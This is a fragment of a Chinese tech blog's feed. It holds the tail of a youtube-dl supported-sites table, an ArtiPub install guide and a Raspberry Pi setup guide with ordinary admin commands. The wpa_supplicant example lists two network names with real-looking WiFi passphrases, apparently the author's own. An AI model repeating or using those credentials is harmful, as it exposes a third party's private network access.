align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">Metacafe</td><td align="left"><a href="http://www.metacafe.com/" target="_blank" rel="noopener">http://www.metacafe.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Magisto</td><td align="left"><a href="http://www.magisto.com/" target="_blank" rel="noopener">http://www.magisto.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Khan Academy</td><td align="left"><a href="https://www.khanacademy.org/" target="_blank" rel="noopener">https://www.khanacademy.org/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Internet Archive</td><td align="left"><a href="https://archive.org/" target="_blank" rel="noopener">https://archive.org/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>Instagram</strong></td><td align="left"><a href="https://instagram.com/" target="_blank" rel="noopener">https://instagram.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">InfoQ</td><td align="left"><a href="http://www.infoq.com/presentations/" target="_blank" rel="noopener">http://www.infoq.com/presentations/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Imgur</td><td align="left"><a href="http://imgur.com/" target="_blank" rel="noopener">http://imgur.com/</a></td><td align="center"></td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">Heavy Music Archive</td><td align="left"><a href="http://www.heavy-music.ru/" target="_blank" rel="noopener">http://www.heavy-music.ru/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">Freesound</td><td align="left"><a href="http://www.freesound.org/" target="_blank" rel="noopener">http://www.freesound.org/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">Flickr</td><td align="left"><a href="https://www.flickr.com/" target="_blank" rel="noopener">https://www.flickr.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">FC2 Video</td><td align="left"><a href="http://video.fc2.com/" target="_blank" rel="noopener">http://video.fc2.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Facebook</td><td align="left"><a href="https://www.facebook.com/" target="_blank" rel="noopener">https://www.facebook.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">eHow</td><td align="left"><a href="http://www.ehow.com/" target="_blank" rel="noopener">http://www.ehow.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Dailymotion</td><td align="left"><a href="http://www.dailymotion.com/" target="_blank" rel="noopener">http://www.dailymotion.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Coub</td><td align="left"><a href="http://coub.com/" target="_blank" rel="noopener">http://coub.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">CBS</td><td align="left"><a href="http://www.cbs.com/" target="_blank" rel="noopener">http://www.cbs.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Bandcamp</td><td align="left"><a href="http://bandcamp.com/" target="_blank" rel="noopener">http://bandcamp.com/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">AliveThai</td><td align="left"><a href="http://alive.in.th/" target="_blank" rel="noopener">http://alive.in.th/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">interest.me</td><td align="left"><a href="http://ch.interest.me/tvn" target="_blank" rel="noopener">http://ch.interest.me/tvn</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>755<br/>ナナゴーゴー</strong></td><td align="left"><a href="http://7gogo.jp/" target="_blank" rel="noopener">http://7gogo.jp/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center"><strong>niconico<br/>ニコニコ動画</strong></td><td align="left"><a href="http://www.nicovideo.jp/" target="_blank" rel="noopener">http://www.nicovideo.jp/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>163<br/>网易视频<br/>网易云音乐</strong></td><td align="left"><a href="http://v.163.com/" target="_blank" rel="noopener">http://v.163.com/</a><br/><a href="http://music.163.com/" target="_blank" rel="noopener">http://music.163.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">56网</td><td align="left"><a href="http://www.56.com/" target="_blank" rel="noopener">http://www.56.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>AcFun</strong></td><td align="left"><a href="http://www.acfun.cn/" target="_blank" rel="noopener">http://www.acfun.cn/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>Baidu<br/>百度贴吧</strong></td><td align="left"><a href="http://tieba.baidu.com/" target="_blank" rel="noopener">http://tieba.baidu.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">爆米花网</td><td align="left"><a href="http://www.baomihua.com/" target="_blank" rel="noopener">http://www.baomihua.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>bilibili<br/>哔哩哔哩</strong></td><td align="left"><a href="http://www.bilibili.com/" target="_blank" rel="noopener">http://www.bilibili.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center">✓</td></tr><tr><td align="center">豆瓣</td><td align="left"><a href="http://www.douban.com/" target="_blank" rel="noopener">http://www.douban.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">斗鱼</td><td align="left"><a href="http://www.douyutv.com/" target="_blank" rel="noopener">http://www.douyutv.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">凤凰视频</td><td align="left"><a href="http://v.ifeng.com/" target="_blank" rel="noopener">http://v.ifeng.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">风行网</td><td align="left"><a href="http://www.fun.tv/" target="_blank" rel="noopener">http://www.fun.tv/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">iQIYI<br/>爱奇艺</td><td align="left"><a href="http://www.iqiyi.com/" target="_blank" rel="noopener">http://www.iqiyi.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">激动网</td><td align="left"><a href="http://www.joy.cn/" target="_blank" rel="noopener">http://www.joy.cn/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">酷6网</td><td align="left"><a href="http://www.ku6.com/" target="_blank" rel="noopener">http://www.ku6.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">酷狗音乐</td><td align="left"><a href="http://www.kugou.com/" target="_blank" rel="noopener">http://www.kugou.com/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">酷我音乐</td><td align="left"><a href="http://www.kuwo.cn/" target="_blank" rel="noopener">http://www.kuwo.cn/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">乐视网</td><td align="left"><a href="http://www.le.com/" target="_blank" rel="noopener">http://www.le.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">荔枝FM</td><td align="left"><a href="http://www.lizhi.fm/" target="_blank" rel="noopener">http://www.lizhi.fm/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">秒拍</td><td align="left"><a href="http://www.miaopai.com/" target="_blank" rel="noopener">http://www.miaopai.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">MioMio弹幕网</td><td align="left"><a href="http://www.miomio.tv/" target="_blank" rel="noopener">http://www.miomio.tv/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">MissEvan<br/>猫耳FM</td><td align="left"><a href="http://www.missevan.com/" target="_blank" rel="noopener">http://www.missevan.com/</a></td><td align="center"></td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">痞客邦</td><td align="left"><a href="https://www.pixnet.net/" target="_blank" rel="noopener">https://www.pixnet.net/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">PPTV聚力</td><td align="left"><a href="http://www.pptv.com/" target="_blank" rel="noopener">http://www.pptv.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">齐鲁网</td><td align="left"><a href="http://v.iqilu.com/" target="_blank" rel="noopener">http://v.iqilu.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">QQ<br/>腾讯视频</td><td align="left"><a href="http://v.qq.com/" target="_blank" rel="noopener">http://v.qq.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">企鹅直播</td><td align="left"><a href="http://live.qq.com/" target="_blank" rel="noopener">http://live.qq.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Sina<br/>新浪视频<br/>微博秒拍视频</td><td align="left"><a href="http://video.sina.com.cn/" target="_blank" rel="noopener">http://video.sina.com.cn/</a><br/><a href="http://video.weibo.com/" target="_blank" rel="noopener">http://video.weibo.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Sohu<br/>搜狐视频</td><td align="left"><a href="http://tv.sohu.com/" target="_blank" rel="noopener">http://tv.sohu.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>Tudou<br/>土豆</strong></td><td align="left"><a href="http://www.tudou.com/" target="_blank" rel="noopener">http://www.tudou.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">虾米</td><td align="left"><a href="http://www.xiami.com/" target="_blank" rel="noopener">http://www.xiami.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center">✓</td></tr><tr><td align="center">阳光卫视</td><td align="left"><a href="http://www.isuntv.com/" target="_blank" rel="noopener">http://www.isuntv.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>音悦Tai</strong></td><td align="left"><a href="http://www.yinyuetai.com/" target="_blank" rel="noopener">http://www.yinyuetai.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center"><strong>Youku<br/>优酷</strong></td><td align="left"><a href="http://www.youku.com/" target="_blank" rel="noopener">http://www.youku.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">战旗TV</td><td align="left"><a href="http://www.zhanqi.tv/lives" target="_blank" rel="noopener">http://www.zhanqi.tv/lives</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">央视网</td><td align="left"><a href="http://www.cntv.cn/" target="_blank" rel="noopener">http://www.cntv.cn/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">Naver<br/>네이버</td><td align="left"><a href="http://tvcast.naver.com/" target="_blank" rel="noopener">http://tvcast.naver.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">芒果TV</td><td align="left"><a href="http://www.mgtv.com/" target="_blank" rel="noopener">http://www.mgtv.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">火猫TV</td><td align="left"><a href="http://www.huomao.com/" target="_blank" rel="noopener">http://www.huomao.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">阳光宽频网</td><td align="left"><a href="http://www.365yg.com/" target="_blank" rel="noopener">http://www.365yg.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">西瓜视频</td><td align="left"><a href="https://www.ixigua.com/" target="_blank" rel="noopener">https://www.ixigua.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">新片场</td><td align="left"><a href="https://www.xinpianchang.com//" target="_blank" rel="noopener">https://www.xinpianchang.com//</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">快手</td><td align="left"><a href="https://www.kuaishou.com/" target="_blank" rel="noopener">https://www.kuaishou.com/</a></td><td align="center">✓</td><td align="center">✓</td><td align="center"></td></tr><tr><td align="center">抖音</td><td align="left"><a href="https://www.douyin.com/" target="_blank" rel="noopener">https://www.douyin.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">TikTok</td><td align="left"><a href="https://www.tiktok.com/" target="_blank" rel="noopener">https://www.tiktok.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">中国体育(TV)</td><td align="left"><a href="http://v.zhibo.tv/" target="_blank" rel="noopener">http://v.zhibo.tv/</a> </br><a href="http://video.zhibo.tv/" target="_blank" rel="noopener">http://video.zhibo.tv/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr><tr><td align="center">知乎</td><td align="left"><a href="https://www.zhihu.com/" target="_blank" rel="noopener">https://www.zhihu.com/</a></td><td align="center">✓</td><td align="center"></td><td align="center"></td></tr></tbody></table><p>还有一些其他的国外网站没有列出来，如果需要支持更多的国外网站，可以配合使用<code>youtube-dl</code>工具一起使用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h2&gt;&lt;p&gt;youtube-dl 是一个命令行工具，对我所知的大部分视频网站有不错的支持，你可以选择下载视频，或是将视频流直接导出到自己想使用的播放器中</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="python" scheme="https://seniortesting.club/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>artipub多平台博客发布工具使用配置</title>
    <link href="https://seniortesting.club/posts/6cVcvBRnEb/"/>
    <id>https://seniortesting.club/posts/6cVcvBRnEb/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<p>ArtiPub (Article Publisher的简称，意为”文章发布者”)是一款开源的一文多发平台，可以帮助文章作者将编写好的文章自动发布到掘金、SegmentFault、CSDN、知乎、开源中国等技术媒体平台，传播优质知识，获取最大的曝光度。ArtiPub安装简单，提供了多种安装方式，可以一键安装使用，安装一般只要5分钟。</p><h3 id="通过源码安装"><a href="#通过源码安装" class="headerlink" title="通过源码安装"></a>通过源码安装</h3><ul><li><strong>克隆Github Repo</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/crawlab-team/artipub</span><br></pre></td></tr></table></figure><ul><li><strong>安装npm包</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> artipub</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><ul><li><strong>启动前端</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start:frontend</span><br></pre></td></tr></table></figure><ul><li><strong>启动后端</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run start:backend</span><br></pre></td></tr></table></figure><ul><li><strong>配置数据库</strong></li></ul><p>数据库的配置在<code>./config.js</code>中，可以按情况配置。</p><ul><li><strong>配置后端API地址</strong></li></ul><p>如果您部署的服务不在本机，需要在<code>./src/config/config.ts</code>中将<code>apiEndpoint</code>改成对应的IP地址+端口。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;ArtiPub (Article Publisher的简称，意为”文章发布者”)是一款开源的一文多发平台，可以帮助文章作者将编写好的文章自动发布到掘金、SegmentFault、CSDN、知乎、开源中国等技术媒体平台，传播优质知识，获取最大的曝光度。ArtiPub安装简单，</summary>
      
    
    
    
    <category term="开发工具" scheme="https://seniortesting.club/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
  </entry>
  
  <entry>
    <title>树莓派Linux安装及其环境配置</title>
    <link href="https://seniortesting.club/posts/ygO7qwrfZY/"/>
    <id>https://seniortesting.club/posts/ygO7qwrfZY/</id>
    <published>2021-03-25T15:12:53.000Z</published>
    <updated>2021-04-18T13:00:39.459Z</updated>
    
    <content type="html"><![CDATA[<h2 id="树莓派下载"><a href="#树莓派下载" class="headerlink" title="树莓派下载"></a>树莓派下载</h2><ul><li>官方下载链接： <a href="https://www.raspberrypi.org/downloads/raspberry-pi-os/" target="_blank" rel="noopener">https://www.raspberrypi.org/downloads/raspberry-pi-os/</a></li><li>下载地址： <a href="https://downloads.raspberrypi.org/" target="_blank" rel="noopener">https://downloads.raspberrypi.org/</a></li><li>64位raspian系统下载：<a href="https://downloads.raspberrypi.org/raspios_arm64/" target="_blank" rel="noopener">https://downloads.raspberrypi.org/raspios_arm64/</a></li></ul><h2 id="树莓派架构"><a href="#树莓派架构" class="headerlink" title="树莓派架构"></a>树莓派架构</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ lscpu </span><br><span class="line">$ cat &#x2F;proc&#x2F;cpuinfo</span><br><span class="line">processor : 0</span><br><span class="line">model name : ARMv7 Processor rev 3 (v7l)</span><br><span class="line">BogoMIPS : 108.00</span><br><span class="line">Features : half thumb fastmult vfp edsp neon vfpv3 tls vfpv4 idiva idivt vfpd32 lpae evtstrm crc32 </span><br><span class="line">CPU implementer : 0x41</span><br><span class="line">CPU architecture: 7</span><br><span class="line">CPU variant : 0x0</span><br><span class="line">CPU part : 0xd08</span><br><span class="line">CPU revision : 3</span><br></pre></td></tr></table></figure><h2 id="树莓派架构版本"><a href="#树莓派架构版本" class="headerlink" title="树莓派架构版本"></a>树莓派架构版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;device-tree&#x2F;model</span><br><span class="line">Raspberry Pi 4 Model B Rev 1.2</span><br></pre></td></tr></table></figure><h2 id="检查Raspbian系统版本"><a href="#检查Raspbian系统版本" class="headerlink" title="检查Raspbian系统版本"></a>检查Raspbian系统版本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;os-release</span><br><span class="line">lsb_release -a</span><br></pre></td></tr></table></figure><h2 id="配置成64位操作系统-不再使用，直接使用已经支持的64位系统）"><a href="#配置成64位操作系统-不再使用，直接使用已经支持的64位系统）" class="headerlink" title="配置成64位操作系统(不再使用，直接使用已经支持的64位系统）"></a><del>配置成64位操作系统(不再使用，直接使用已经支持的64位系统）</del></h2><p>参考指导：<a href="https://www.raspberrypi.org/forums/viewtopic.php?t=208314&amp;start=299" target="_blank" rel="noopener">https://www.raspberrypi.org/forums/viewtopic.php?t=208314&amp;start=299</a><br>脚本如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo raspi-config # enable OpenGL driver</span><br><span class="line">sudo apt install -y debootstrap schroot</span><br><span class="line">cat &lt;&lt; EOF | sudo tee &#x2F;etc&#x2F;schroot&#x2F;chroot.d&#x2F;pi64</span><br><span class="line">[pi64]</span><br><span class="line">description&#x3D;VC4 arm64 testing</span><br><span class="line">type&#x3D;directory</span><br><span class="line">directory&#x3D;&#x2F;srv&#x2F;chroot&#x2F;pi64</span><br><span class="line">users&#x3D;pi</span><br><span class="line">root-groups&#x3D;root</span><br><span class="line">profile&#x3D;desktop</span><br><span class="line">personality&#x3D;linux</span><br></pre></td></tr></table></figure><h2 id="树莓派安装"><a href="#树莓派安装" class="headerlink" title="树莓派安装"></a>树莓派安装</h2><blockquote><p><del>3b和3b+虽然是arm64 v8的芯片，但是raspbian是32的，所以只能安装arm v7的包，目前2020年5月左右已经出来了64位系统镜像</del></p></blockquote><p>SDCard格式化工具： <a href="https://www.sdcard.org/downloads/formatter/eula_windows/index.html" target="_blank" rel="noopener">https://www.sdcard.org/downloads/formatter/eula_windows/index.html</a></p><ol><li><p>从官方下载最新的镜像，推荐下载最新的镜像： <a href="https://www.raspberrypi.org/downloads/raspbian/" target="_blank" rel="noopener">下载首页地址</a>,在该网页中选择”<br>Raspbian Buster Lite”,截止到2019年8月12日，最新的树莓派版本是Buster版。此处选择的是最小镜像。</p></li><li><p>安装步骤参考官网： <a href="https://www.raspberrypi.org/documentation/" target="_blank" rel="noopener">官方文档</a>,使用的是工具是[Win32DiskImager].</p></li><li><p>安装结束后，你需要打开SD卡，也就是对应的Boot Folder,在该目录下放两个文件：</p></li></ol><p>3.1 空文件<code>ssh</code>,没有后缀也没有任何内容，这个用于远程SSH登录。<br>3.2 新建一个文件<code>wpa_supplicant.conf</code>文件，输入如下内容对应你的需要连接的wifi信息(此处我这里输入了两个WiFi配置信息）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ctrl_interface&#x3D;&#x2F;var&#x2F;run&#x2F;wpa_supplicant</span><br><span class="line">update_config&#x3D;1</span><br><span class="line"></span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">    ssid&#x3D;&quot;FOffice&quot;</span><br><span class="line">    psk&#x3D;&quot;L0ngh)*%z2&amp;r7p1&quot;</span><br><span class="line">    priority&#x3D;2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">network&#x3D;&#123;</span><br><span class="line">    ssid&#x3D;&quot;CMCC-MiniWifi&quot;</span><br><span class="line">    psk&#x3D;&quot;A5#$2a7&amp;y1nr+&quot;</span><br><span class="line">    priority&#x3D;1</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>参考</strong>：</p><ul><li><a href="https://www.raspberrypi.org/documentation/configuration/boot_folder.md" target="_blank" rel="noopener">The Boot folder contents</a></li></ul><h2 id="无线访问树莓派"><a href="#无线访问树莓派" class="headerlink" title="无线访问树莓派"></a>无线访问树莓派</h2><ol><li>官方给出了一些方案： <a href="https://www.raspberrypi.org/documentation/remote-access/ip-address.md" target="_blank" rel="noopener">官方文档方案无线连接树莓派</a>,大致几种方案：</li></ol><p>1.1 首次安装后树莓派的名称是: <code>raspberrypi.local</code>,所以可以通过在同一个网站中直接ping：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping raspberrypi.local</span><br></pre></td></tr></table></figure><p>1.2 通过手机端安装一个叫 Fing的app进行扫描局域网的所有机器，可以快速定位你的树莓派地址。</p><p>1.3 通过电脑端安装<a href="https://www.advanced-ip-scanner.com/" target="_blank" rel="noopener">Free Advanced IP Scanner</a>或<a href="https://angryip.org/" target="_blank" rel="noopener">Angry IP Scanner</a>扫描局域网的所有机器，也可以快速定位你的树莓派机器。（推荐此种方法）</p><h2 id="树莓派配置"><a href="#树莓派配置" class="headerlink" title="树莓派配置"></a>树莓派配置</h2><p>命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo raspi-config</span><br></pre></td></tr></table></figure><h2 id="网页管理树莓派"><a href="#网页管理树莓派" class="headerlink" title="网页管理树莓派"></a>网页管理树莓派</h2><ol><li>访问<a href="https://app.remote.it/web/" target="_blank" rel="noopener">remote.it网站</a>，注册一个账号，然后安装指引在树莓派上安装如下命令：</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install connectd</span><br><span class="line">sudo connectd_installer</span><br></pre></td></tr></table></figure><ol start="2"><li>继续访问上面的网站就能看到自己的树莓派了。</li></ol><h2 id="软件镜像源切换"><a href="#软件镜像源切换" class="headerlink" title="软件镜像源切换"></a>软件镜像源切换</h2><p>为了方便今后软件的安装，我们需要将软件源更换为国内源：<br>输入以下代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nano &#x2F;etc&#x2F;apt&#x2F;sources.list</span><br></pre></td></tr></table></figure><p>内容修改为如下:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main contrib non-free rpi</span><br><span class="line">deb-src http://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/ buster main contrib non-free rpi</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> deb http://raspbian.raspberrypi.org/raspbian/ buster main contrib non-free rpi</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Uncomment line below <span class="keyword">then</span> <span class="string">&#x27;apt-get update&#x27;</span> to <span class="built_in">enable</span> <span class="string">&#x27;apt-get source&#x27;</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash">deb-src http://raspbian.raspberrypi.org/raspbian/ buster main contrib non-free rpi</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ctrl+o键进行保存，回车确认，再ctrl+x退出.输入sodu reboot重启，待重启后再重新用PuTTY进行ssh连接。输入以下代码进行系统文件更新：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><h2 id="jdk-安装"><a href="#jdk-安装" class="headerlink" title="jdk 安装"></a>jdk 安装</h2><ol><li>检查当前树莓派的系统版本： <code>cat /proc/cpuinfo</code> 或者<code>uname –m</code>,我的树莓派3B+输出的是<code>armv7l</code>,查阅资料确认是32位的机器：<br><a href="https://unix.stackexchange.com/questions/136407/is-my-linux-arm-32-or-64-bit" target="_blank" rel="noopener">检查树莓派是32位还是64位</a>.</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">You can find the processor model in &#x2F;proc&#x2F;cpuinfo. For example:</span><br><span class="line"></span><br><span class="line">$ cat &#x2F;proc&#x2F;cpuinfo</span><br><span class="line">Processor       : ARMv7 Processor rev 10 (v7l)</span><br><span class="line">ARMv7 (and below) is 32-bit. ARMv8 introduces the 64-bit instruction set.</span><br><span class="line"></span><br><span class="line">If you want to see whether your system supports 64-bit binaries, check the kernel architecture:</span><br><span class="line"></span><br><span class="line">$ uname -m</span><br><span class="line">armv7l</span><br><span class="line">On a 64-bit processor, you&#39;d see armv8 (or above).</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><p>确认了机器的型号，然后到官方的oracle网站，现在oracle已经提供了ARM架构的jdk安装包，叫做： Linux ARM 32 Hard Float ABI/Linux ARM 64 Hard Float ABI,此处我们选择： Linux ARM 32 Hard Float ABI，下载该安装包到对应的树莓派机器上。</p></li><li><p>复制该安装包<code>jdk-8u221-linux-arm32-vfp-hflt.tar.gz</code>执行如下命令安装 (注意将<code>/opt/jdk/jdk1.8.0_221</code>替换成你解压的目录)：</p></li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">tar -zxf jdk-8u221-linux-arm32-vfp-hflt.tar.gz</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;java java &#x2F;opt&#x2F;jdk&#x2F;jdk1.8.0_221&#x2F;bin&#x2F;java 1</span><br><span class="line">sudo update-alternatives --install &#x2F;usr&#x2F;bin&#x2F;javac javac &#x2F;opt&#x2F;jdk&#x2F;jdk1.8.0_221&#x2F;bin&#x2F;javac 1</span><br><span class="line">java -version</span><br><span class="line">javac </span><br></pre></td></tr></table></figure><h1 id="爬虫-安装selenium及其对应的chrome-driver"><a href="#爬虫-安装selenium及其对应的chrome-driver" class="headerlink" title="爬虫, 安装selenium及其对应的chrome driver"></a>爬虫, 安装selenium及其对应的chrome driver</h1><p>参考网站： <a href="https://www.raspberrypi.org/forums/viewtopic.php?t=194176" target="_blank" rel="noopener">https://www.raspberrypi.org/forums/viewtopic.php?t=194176</a></p><h2 id="步骤"><a href="#步骤" class="headerlink" 